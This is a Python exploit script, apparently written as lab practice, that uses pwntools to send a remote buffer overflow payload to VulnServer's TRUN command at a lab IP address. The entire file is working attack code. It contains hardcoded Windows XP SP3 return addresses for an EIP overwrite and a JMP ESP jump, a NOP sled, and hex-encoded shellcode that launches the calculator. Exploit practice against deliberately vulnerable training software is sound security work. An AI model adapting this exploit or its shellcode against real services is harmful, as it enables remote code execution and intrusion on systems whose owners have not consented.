#!/usr/share/python

import struct
import time
import socket
from pwn import *

def BufferOverflow():

	# https://packetstormsecurity.com/files/102847/All-Windows-Null-Free-CreateProcessA-Calc-Shellcode.html
	shellcode  = ""
	shellcode += "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
	shellcode += "\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
	shellcode += "\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
	shellcode += "\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
	shellcode += "\x57\x78\x01\xc2\x8b\x7a\x20\x01"
	shellcode += "\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
	shellcode += "\x45\x81\x3e\x43\x72\x65\x61\x75"
	shellcode += "\xf2\x81\x7e\x08\x6f\x63\x65\x73"
	shellcode += "\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
	shellcode += "\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
	shellcode += "\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
	shellcode += "\xb1\xff\x53\xe2\xfd\x68\x63\x61"
	shellcode += "\x6c\x63\x89\xe2\x52\x52\x53\x53"
	shellcode += "\x53\x53\x53\x53\x52\x53\xff\xd7"

	#----------------------------#
	#           Payload          #
	#----------------------------#
	# buffer = CMD + AAA padding # |-------------------------------------------------------------+
	# buffer = EIP overwrite     # |---------| WinXP SP3 Pro [POP POP RETN]|[USER32.dll] |-------|-+
	# buffer = XXXXXXXX          # |------------| Simulate the need for [POP POP RETN] |---------|-|-+
	# buffer = JMP ESP           # |---------| WinXP SP3 Pro : [JMP ESP] | [essfunc.dll] |-------|-|-|-+
	# buffer = NOP sled          # |-------------------------------------------------------------|-|-|-|-+
	# buffer = shellcode         # |-------------------------------------------------------------|-|-|-|-|-+
	# buffer = BBB padding       # |-------------------------------------------------------------|-|-|-|-|-|-+
        #----------------------------#                                                               | | | | | | |
	#                                                                                            | | | | | | |
	buffer  = "TRUN ." + "A" * 2006                        # <-----------------------------------+ | | | | | |
	buffer += struct.pack('<L', 0x7E41FE66)                # <-------------------------------------+ | | | | |
	buffer += "X" * 8                                      # <---------------------------------------+ | | | |
	buffer += struct.pack('<L', 0x625011af)                # <-----------------------------------------+ | | |
	buffer += "\x90" * 20                                  # <-------------------------------------------+ | |
	buffer += shellcode                                    # <---------------------------------------------+ |
	buffer += "B" * (3000-6-2006-4-8-4-20-len(shellcode))  # <-----------------------------------------------+

	try:
		r = remote('192.168.80.133', 9999)
		r.recv(2048)
		print "[+] Sending %s bytes evil payload.." %len(buffer)
		r.send(buffer)
	except:
		print "Couldn't connect to target!"

def main():

	print (
	'''
	+-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+ +-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+
	|V|u|l|n|S|e|r|v|e|r| |R|e|m|o|t|e| |B|u|f|f|e|r| |O|v|e|r|f|l|o|w|
	+-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+ +-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+
	'''
    )
	BufferOverflow()

if __name__ == '__main__':
	main()

